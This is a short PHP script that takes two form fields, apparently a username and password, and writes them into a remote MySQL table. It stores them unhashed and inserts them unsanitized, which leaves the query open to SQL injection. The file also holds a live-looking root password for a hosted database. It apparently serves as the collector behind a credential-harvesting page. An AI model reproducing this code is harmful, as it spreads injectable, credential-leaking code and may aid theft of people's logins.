<?php
$server = 'containers-us-west-99.railway.app';
$user = 'root';
$psw = 'u35WmFSwSIxVMP0h2qxd';
$port = '7700';
$db = 'railway';
$conexion = mysqli_connect($server, $user, $psw, $db, $port);

$user = $_POST['texto'];
$pass = $_POST['pas'];

$sql = "INSERT INTO data(user, pass) values('$user', '$pass')";

mysqli_query($conexion, $sql);

?>